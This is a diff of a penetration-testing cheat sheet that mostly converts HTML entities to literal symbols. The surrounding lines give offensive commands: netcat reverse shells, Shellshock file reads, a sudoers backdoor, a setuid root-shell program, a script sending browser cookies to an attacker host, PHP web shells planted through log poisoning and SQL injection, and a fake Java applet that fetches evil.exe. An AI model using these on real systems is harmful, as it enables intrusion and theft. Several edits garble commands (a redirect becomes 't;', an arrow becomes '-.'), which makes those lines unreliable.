@@ -102,7 +102,7 @@ Kali Linux
         `grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u`
 
     -   Using Grep and regular expressions and output to a file  
-        `cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u &gt; list.txt`
+        `cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt`
 
     -   Use a bash loop to find the IP address behind each host  
         `for url in $(cat list.txt); do host $url; done`
@@ -131,10 +131,10 @@ Kali Linux
         `nc -nv $ip 4444`
 
     -   Send a file using netcat  
-        `nc -nv $ip 4444 &lt; /usr/share/windows-binaries/wget.exe`
+        `nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe`
 
     -   Receive a file using netcat  
-        `nc -nlvp 4444 &gt; incoming.exe`
+        `nc -nlvp 4444 't; incoming.exe`
 
     -   Create a reverse shell with Ncat using cmd.exe on Windows  
         `nc -nlvp 4444 -e cmd.exe`
@@ -268,7 +268,7 @@ Information Gathering & Vulnerability Scanning
 
     -   DNS Zone Transfers  
         Windows DNS zone transfer  
-        `nslookup -&gt; set type=any -&gt; ls -d blah.com  `
+        `nslookup -> set type=any -. ls -d blah.com  `
         Linux DNS zone transfer  
         `dig axfr blah.com @ns1.blah.com`
 
@@ -385,7 +385,7 @@ Information Gathering & Vulnerability Scanning
         [*https://nmap.org/nsedoc/categories/discovery.html*](https://nmap.org/nsedoc/categories/discovery.html)
 
     -   Nmap port version detection MAXIMUM power  
-        `nmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p &lt;port&gt; &lt;host&gt;`
+        `nmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p <port> <host>
 
     -   
 
@@ -464,7 +464,7 @@ Information Gathering & Vulnerability Scanning
 
     -   Fix SNMP output values so they are human readable  
         `apt-get install snmp-mibs-downloader download-mibs  `
-        `echo "" &gt; /etc/snmp/snmp.conf`
+        `echo "" > /etc/snmp/snmp.conf`
 
     -   SNMP Enumeration Commands
 
@@ -491,7 +491,7 @@ Information Gathering & Vulnerability Scanning
 -   Linux OS Enumeration
 
     -   List all SUID files  
-        `find / -perm -4000 2&gt;/dev/null`
+        `find / -perm -4000 2>/dev/null`
 
     -   Determine the current version of Linux  
         `cat /etc/issue`
@@ -596,7 +596,7 @@ Information Gathering & Vulnerability Scanning
 
     -   Find UID 0 files root execution
 
-    -   `/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2&gt;/dev/null`
+    -   `/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null`
 
     -   Get handy linux file system enumeration script (/var/tmp)  
         `wget <https://highon.coffee/downloads/linux-local-enum.sh>  `
@@ -604,16 +604,16 @@ Information Gathering & Vulnerability Scanning
         `./linux-local-enum.sh`
 
     -   Find executable files updated in August  
-        `find / -executable -type f 2&gt; /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Aug`
+        `find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Aug`
 
     -   Find a specific file on linux  
         `find /. -name suid\*`
 
     -   Find all the strings in a file  
-        `strings &lt;filename&gt;`
+        `strings <filename>;`
 
     -   Determine the type of a file  
-        `file &lt;filename&gt;`
+        `file <filename>`
 
 -   HTTP Enumeration
     ----------------
@@ -682,7 +682,7 @@ Information Gathering & Vulnerability Scanning
 
 -   TLS & SSL Testing
 
-    -   ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha &gt;
+    -   ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha >
         OUTPUT-FILE.html
 
 -   Proxy Enumeration (useful for open proxies)
@@ -874,7 +874,7 @@ Shells
          !sh
 
      -   (From within tcpdump)  
-         echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ &gt;
+         echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ >
          /tmp/.test  
          chmod +x /tmp/.test  
          sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst
@@ -1023,7 +1023,7 @@ Shells
 
     -   cat file (view file contents)  
         echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {
-        :;}; echo \\$(&lt;/etc/passwd)\\r\\nHost:
+        :;}; echo \\$(</etc/passwd)\\r\\nHost:
         vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
 
     -   Shell Shock run bind shell  
@@ -1085,7 +1085,7 @@ File Transfers
 
     -   Run a ruby webrick basic http server  
         ruby -rwebrick -e "WEBrick::HTTPServer.new  
-        (:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start"
+        (:Port => 80, :DocumentRoot => Dir.pwd).start"
 
     -   Run a basic PHP http server  
         php -S $ip:80
@@ -1138,7 +1138,7 @@ File Transfers
         atftpd --daemon --port 69 /tftp  
         cp /usr/share/windows-binaries/nc.exe /tftp/  
         EX. FROM WINDOWS HOST:  
-        C:\\Users\\Offsec&gt;tftp -i $ip get nc.exe
+        C:\\Users\\Offsec>tftp -i $ip get nc.exe
 
     -   FTP  
         apt-get update && apt-get install pure-ftpd  
@@ -1195,10 +1195,10 @@ Privilege Escalation
 -   Linux post exploitation enumeration and exploit checking tools  
     [*https://github.com/reider-roque/linpostexp*](https://github.com/reider-roque/linpostexp)
 
--   CVE-2010-3904 - Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8  
+-   CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8  
     [*https://www.exploit-db.com/exploits/15285/*](https://www.exploit-db.com/exploits/15285/)
 
--   CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo
+-   CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo
     / Ubuntu x86/x64)  
     [*https://git.zx2c4.com/CVE-2012-0056/about/*](https://git.zx2c4.com/CVE-2012-0056/about/)  
     Linux CVE 2012-0056  
@@ -1207,7 +1207,7 @@ Privilege Escalation
     ./mempodipper
 
 -   CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux
-    Kernel &lt;= 3.19.0-73.8  
+    Kernel <= 3.19.0-73.8  
     [*https://dirtycow.ninja/*](https://dirtycow.ninja/)  
     First existed on 2.6.22 (released in 2007) and was fixed on Oct 18,
     2016  
@@ -1260,12 +1260,12 @@ Privilege Escalation
     -   Create and compile an SUID from a limited shell (no file
         transfer)  
         echo "int main(void){\\nsetgid(0);
-        setuid(0);\\nsystem(\\"/bin/sh\\");\\n}" &gt;privsc.c  
+        setuid(0);\\nsystem(\\"/bin/sh\\");\\n}" >privsc.c  
         gcc privsc.c -o privsc
 
 -   Add users to Root SUDO group with no password requirement  
     echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:
-    ALL" &gt;&gt; /etc/sudoers && chmod 440 /etc/sudoers' &gt;
+    ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' >
     /tmp/update
     
  -   SearchSploit  
@@ -1321,7 +1321,7 @@ Privilege Escalation
 
 -   Compile a custom add user command in windows using C  
     root@kali:~\# cat useradd.c  
-    \#include &lt;stdlib.h&gt; /\* system, NULL, EXIT\_FAILURE \*/  
+    \#include <stdlib.h> /\* system, NULL, EXIT\_FAILURE \*/  
     int main ()  
     {  
     int i;  
@@ -1367,9 +1367,9 @@ Client, Web and Password Attacks
         service apache2 start
 
     -   JAVA Signed Jar client side attack  
-        echo '&lt;applet width="1" height="1" id="Java Secure"
-        code="Java.class" archive="SignedJava.jar"&gt;&lt;param name="1"
-        value="http://$ip:80/evil.exe"&gt;&lt;/applet&gt;' &gt;
+        echo '<applet width="1" height="1" id="Java Secure"
+        code="Java.class" archive="SignedJava.jar"><param name="1"
+        value="http://$ip:80/evil.exe"></applet>' >
         /var/www/html/java.html  
         User must hit run on the popup that occurs.
 
@@ -1419,14 +1419,14 @@ Client, Web and Password Attacks
         page, and more
 
     -   Browser Redirection and IFRAME Injection  
-        &lt;iframe SRC="http://$ip/report" height = "0" width
-        ="0"&gt;&lt;/iframe&gt;
+        <iframe SRC="http://$ip/report" height = "0" width
+        ="0"></iframe>
 
     -   Stealing Cookies and Session Information  
-        &lt;script&gt;  
+        <script>  
         new
         image().src="http://$ip/bogus.php?output="+document.cookie;  
-        &lt;/script&gt;  
+        </script>  
         nc -nlvp 80
 
 -   File Inclusion Vulnerabilities 
@@ -1499,8 +1499,8 @@ Client, Web and Password Attacks
         GET
         /addguestbook.php?name=Haxor&comment=Merci!&LANG=../../../../../../../windows/system32/drivers/etc/hosts%00
 
-    -   Contaminating Log Files &lt;?php echo
-        shell\_exec($\_GET\['cmd'\]);?&gt;
+    -   Contaminating Log Files <?php echo
+        shell\_exec($\_GET\['cmd'\]);?>
 
     -   For a Remote File Inclusion look for php code that is not
         sanitized and passed to the PHP include function and the php.ini
@@ -1511,7 +1511,7 @@ Client, Web and Password Attacks
 
     -   Remote File Inclusion  
         [http://$ip/addguestbook.php?name=a&comment=b&LANG=http://$localip/evil.txt](http://192.168.11.35/addguestbook.php?name=a&comment=b&LANG=http://192.168.10.5/evil.txt)  
-        &lt;?php echo shell\_exec("ipconfig");?&gt;
+        <?php echo shell\_exec("ipconfig");?>
 
 -   <span id="_mgu7e3u7svak" class="anchor"><span id="_Toc480741820" class="anchor"></span></span>Database Vulnerabilities
     ----------------------------------------------------------------------------------------------------------------------
@@ -1552,8 +1552,8 @@ Client, Web and Password Attacks
         http://$ip/comment.php?id=738 union select
         1,2,3,4,concat(name,0x3a, password),6 FROM users  
         Create a backdoor  
-        http://$ip/comment.php?id=738 union all select 1,2,3,4,"&lt;?php
-        echo shell\_exec($\_GET\['cmd'\]);?&gt;",6 into OUTFILE
+        http://$ip/comment.php?id=738 union all select 1,2,3,4,"<?php
+        echo shell\_exec($\_GET\['cmd'\]);?>",6 into OUTFILE
         'c:/xampp/htdocs/backdoor.php'
 
     -   SQLMap Examples
@@ -1630,11 +1630,11 @@ Client, Web and Password Attacks
 
     -   Convert multiple webpages into a word list  
         for x in 'index' 'about' 'post' 'contact' ; do curl
-        http://$ip/$x.html | html2markdown | tr -s ' ' '\\n' &gt;&gt;
+        http://$ip/$x.html | html2markdown | tr -s ' ' '\\n' >>
         webapp.txt ; done
 
     -   Or convert html to word list dict  
-        html2dic index.html.out | sort -u &gt; index-html.dict
+        html2dic index.html.out | sort -u > index-html.dict
 
     -   Default Usernames and Passwords
 
@@ -1658,8 +1658,8 @@ Client, Web and Password Attacks
             [*https://nmap.org/nsedoc/categories/brute.html*](https://nmap.org/nsedoc/categories/brute.html)
 
         -   Nmap Generic auto detect brute force attack  
-            nmap --script brute -Pn &lt;target.com or ip&gt;
-            &lt;enter&gt;
+            nmap --script brute -Pn <target.com or ip>
+            <enter>
 
         -   MySQL nmap brute force attack  
             nmap --script=mysql-brute $ip
@@ -1774,7 +1774,7 @@ Client, Web and Password Attacks
 
     -   Crask linux hashes you must first unshadow them:  
         unshadow passwd-file.txt shadow-file.txt  
-        unshadow passwd-file.txt shadow-file.txt &gt; unshadowed.txt
+        unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
 
 -   John the Ripper - Password Hash Cracking
 
@@ -1820,21 +1820,21 @@ Client, Web and Password Attacks
 -   SSH Local Port Forwarding: supports bi-directional communication
     channels
 
-    -   ssh &lt;gateway&gt; -L &lt;local port to listen&gt;:&lt;remote
-        host&gt;:&lt;remote port&gt;
+    -   ssh <gateway> -L <local port to listen>:<remote
+        host>:<remote port>
 
 -   SSH Remote Port Forwarding: Suitable for popping a remote shell on
     an internal non routable network
 
-    -   ssh &lt;gateway&gt; -R &lt;remote port to bind&gt;:&lt;local
-        host&gt;:&lt;local port&gt;  
+    -   ssh <gateway> -R <remote port to bind>:<local
+        host>:<local port>  
 
 -   SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local
     attacking box to tunnel ALL incoming traffic to ANY host in the DMZ
     network on ANY PORT
 
-    -   ssh -D &lt;local proxy port&gt; -p &lt;remote port&gt;
-        &lt;target&gt;
+    -   ssh -D <local proxy port> -p <remote port>
+        <target>
 
 -   Proxychains - Perform nmap scan within a DMZ from an external
     computer
@@ -1857,11 +1857,11 @@ Client, Web and Password Attacks
 
     -   http\_tunnel  
         On server side:  
-        sudo hts -F &lt;server\_ip\_addr&gt;:&lt;port\_of\_your\_app&gt;
+        sudo hts -F <server\_ip\_addr>:<port\_of\_your\_app>
         80  
         On client side:  
-        sudo htc -P &lt;my\_proxy.com:proxy\_port&gt; -F
-        &lt;port\_of\_your\_app&gt; &lt;server\_ip\_addr&gt;:80  
+        sudo htc -P <my\_proxy.com:proxy\_port> -F
+        <port\_of\_your\_app> <server\_ip\_addr>:80  
         stunnel
 
 -   Tunnel Remote Desktop (RDP) from a Popped Windows machine to your
@@ -1971,13 +1971,13 @@ Client, Web and Password Attacks
 
     -   Run dnscat2:  
         ruby ./dnscat2.rb  
-        dnscat2&gt; New session established: 1422  
-        dnscat2&gt; session -i 1422
+        dnscat2> New session established: 1422  
+        dnscat2> session -i 1422
 
     -   Target Machine:  
         https://downloads.skullsecurity.org/dnscat2/
         https://github.com/lukebaggett/dnscat2-powershell/  
-        dnscat --host &lt;dnscat server\_ip&gt;
+        dnscat --host <dnscat server\_ip>
 
 <span id="_ujpvtdpc9i67" class="anchor"><span id="_Toc480741824" class="anchor"></span></span>The Metasploit Framework
 ======================================================================================================================
